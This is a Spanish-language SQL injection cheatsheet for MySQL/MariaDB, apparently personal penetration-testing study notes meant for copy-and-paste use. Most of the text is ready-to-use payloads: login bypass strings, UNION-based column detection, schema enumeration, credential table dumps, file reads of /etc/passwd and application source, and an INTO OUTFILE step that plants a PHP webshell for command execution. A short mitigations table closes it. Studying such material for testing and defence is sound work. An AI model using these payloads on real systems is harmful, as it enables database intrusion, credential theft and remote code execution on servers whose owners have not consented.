# SQL Injection Cheatsheet (MySQL/MariaDB)

Resumen práctico de payloads y flujo de explotación, basado en las notas de esta carpeta. Pensado para copiar/pegar durante una prueba de intrusión.

---

## 1. Detección (SQLi Discovery)

Probar estos caracteres en cada parámetro (form, GET, POST, headers, cookies):

| Payload | URL Encoded |
|---|---|
| `'` | `%27` |
| `"` | `%22` |
| `#` | `%23` |
| `;` | `%3B` |
| `)` | `%29` |

- Un error de sintaxis SQL al inyectar `'` es la señal más clara de SQLi.
- Recordar que un número impar de comillas rompe la query → hay que cerrar la sintaxis con comentarios o comillas balanceadas.

Ver: [[Intro to SQL Injections]]

### Tipos de SQLi
- **In-band**: Union based / Error based (vemos el output directamente).
- **Blind**: Boolean based / Time based (`SLEEP(5)`).
- **Out-of-band**: exfiltración vía DNS u otro canal externo.

---

## 2. Comentarios en MySQL

| Sintaxis | Nota |
|---|---|
| `-- ` | Requiere espacio después de los dos guiones (`-- -` para que se note en URL) |
| `#` | En navegador usar `%23` porque `#` se interpreta como ancla |
| `/*...*/` | Comentario en línea, poco usado en SQLi básicas |

Ver: [[Using Comments]]

---

## 3. Bypass de autenticación

Query típica vulnerable:
```sql
SELECT * FROM logins WHERE username='$user' AND password='$pass';
```

Payloads de usuario (contraseña puede ser cualquier cosa):

```
admin'--
admin' or '1'='1
' or '1'='1
```

Si hay paréntesis en la query (`WHERE (username='admin' AND id > 1) AND password=...`), hay que cerrarlos:

```
admin')--
```

Lógica clave: `AND` tiene mayor precedencia que `OR`, por lo que `... OR '1'='1' AND password='x'` siempre evalúa a `TRUE` si el `OR` es verdadero, sin importar el `AND`.

Lista extendida de payloads: [PayloadsAllTheThings - Auth Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)

Ver: [[Subverting Query Logic]]

---

## 4. UNION Based Injection

### 4.1 Requisitos del UNION
- Ambas queries deben devolver el **mismo número de columnas**.
- Los tipos de datos por posición deben ser compatibles (usar `NULL` si hay dudas, o números como placeholder).

### 4.2 Detectar número de columnas

**Método A — ORDER BY** (siempre da resultado hasta que falla):
```
' order by 1-- -
' order by 2-- -
' order by 3-- -
' order by 4-- -   <-- error aquí = la tabla tiene 3 columnas
```

**Método B — UNION SELECT** (da error hasta que acierta):
```
' UNION select 1,2,3-- -
' UNION select 1,2,3,4-- -   <-- éxito = 4 columnas
```

### 4.3 Detectar columnas visibles (punto de inyección)
```
cn' UNION select 1,2,3,4-- -
```
Ver qué números aparecen reflejados en la página → esas posiciones son inyectables. La primera columna suele usarse para el `WHERE` original y no se imprime.

### 4.4 Confirmar ejecución de SQL real
```
cn' UNION select 1,@@version,3,4-- -
```

Ver: [[Union Clause]], [[Union Injection]]

---

## 5. Fingerprinting del DBMS

| Payload | Cuándo usarlo | Output esperado |
|---|---|---|
| `SELECT @@version` | Output completo disponible | Versión MySQL/MariaDB |
| `SELECT POW(1,1)` | Solo output numérico | `1` (error en otros DBMS) |
| `SELECT SLEEP(5)` | Blind / sin output | Delay de 5s |

```
cn' UNION select 1,@@version,3,4-- -
```

---

## 6. Enumeración de la base de datos (INFORMATION_SCHEMA)

Flujo: **bases de datos → tablas → columnas → datos**

### 6.1 Base de datos actual
```
cn' UNION select 1,database(),2,3-- -
```

### 6.2 Listar todas las bases de datos
```
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```
> Ignorar `information_schema`, `mysql`, `performance_schema`, `sys` (son por defecto).

### 6.3 Listar tablas de una base de datos
```
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

### 6.4 Listar columnas de una tabla
```
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

### 6.5 Dumpear datos (usar notación `basedatos.tabla` si es otra DB)
```
cn' UNION select 1,username,password,4 from dev.credentials-- -
```

Ver: [[Database Enumeration]]

---

## 7. Enumeración de usuario y privilegios

```
cn' UNION SELECT 1, user(), 3, 4-- -
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

### Privilegios de superusuario
```
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

### Todos los privilegios otorgados
```
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

> Buscar el privilegio `FILE`, necesario para leer/escribir archivos.

Ver: [[Reading Files]]

---

## 8. Lectura de archivos (LOAD_FILE)

Requisitos:
1. Usuario con privilegio `FILE`.
2. `secure_file_priv` vacío (permite todo) o apuntando a un directorio permitido (NULL = deshabilitado).

### Comprobar secure_file_priv
```
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name='secure_file_priv'-- -
```

### Leer un archivo
```
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

### Leer código fuente de la aplicación (leak de credenciales de BD)
```
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```
> Si se renderiza como HTML, ver el código fuente con `Ctrl+U`.

Ver: [[Reading Files]]

---

## 9. Escritura de archivos y RCE (SELECT INTO OUTFILE)

Requisitos:
1. Privilegio `FILE`.
2. `secure_file_priv` vacío.
3. Permisos de escritura en el directorio destino (normalmente corre como `mysql`).

### Prueba de escritura
```
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

### Encontrar el webroot (si no se conoce)
- Leer configuración con `LOAD_FILE`:
  - Apache: `/etc/apache2/apache2.conf`
  - Nginx: `/etc/nginx/nginx.conf`
  - IIS: `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`
- O fuzzear rutas comunes: [wordlist Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) / [wordlist Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)

### Escribir webshell PHP
```
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

Ejecutar comandos:
```
http://SERVER_IP:PORT/shell.php?0=id
```

> Tip: usar `FROM_BASE64("...")` para escribir archivos binarios/complejos.

Ver: [[Writing Files]]

---

## 10. Plantilla de payload UNION (4 columnas, ejemplo genérico)

Ajustar el número de columnas según el paso 4.2, y la posición del dato útil según el paso 4.3.

```
' UNION SELECT 1,2,3,4-- -
' UNION SELECT 1,@@version,3,4-- -
' UNION SELECT 1,database(),3,4-- -
' UNION SELECT 1,schema_name,3,4 FROM information_schema.schemata-- -
' UNION SELECT 1,table_name,table_schema,4 FROM information_schema.tables WHERE table_schema='<DB>'-- -
' UNION SELECT 1,column_name,table_name,4 FROM information_schema.columns WHERE table_name='<TABLA>'-- -
' UNION SELECT 1,<col1>,<col2>,4 FROM <db>.<tabla>-- -
' UNION SELECT 1,user(),3,4-- -
' UNION SELECT 1,variable_value,3,4 FROM information_schema.global_variables WHERE variable_name='secure_file_priv'-- -
' UNION SELECT 1,LOAD_FILE("/etc/passwd"),3,4-- -
' UNION SELECT 1,'<?php system($_REQUEST[0]); ?>',3,4 INTO OUTFILE '/var/www/html/shell.php'-- -
```

---

## 11. Mitigaciones (referencia defensiva)

| Técnica | Ejemplo |
|---|---|
| **Sanitización de input** | `mysqli_real_escape_string()`, `pg_escape_string()` |
| **Validación de input** | Whitelisting con regex, ej. `/^[A-Za-z\s]+$/` |
| **Privilegios mínimos** | Usuario de BD sin `FILE`, sin acceso DBA, `GRANT SELECT` solo en tablas necesarias |
| **WAF** | ModSecurity, Cloudflare — bloquea patrones como `INFORMATION_SCHEMA` |
| **Consultas parametrizadas** | `mysqli_prepare()` + `mysqli_stmt_bind_param()` (la solución más robusta) |

Ver: [[Mitigating SQL Injection]]

---

## Índice de notas relacionadas
- [[Introduction]] · [[Introduction to databases]] · [[Types of databases]]
- [[Intro to MySQL]] · [[SQL Statements]] · [[Query Results]] · [[SQL Operators]]
- [[Intro to SQL Injections]] · [[Subverting Query Logic]] · [[Using Comments]]
- [[Union Clause]] · [[Union Injection]] · [[Database Enumeration]]
- [[Reading Files]] · [[Writing Files]] · [[Mitigating SQL Injection]]
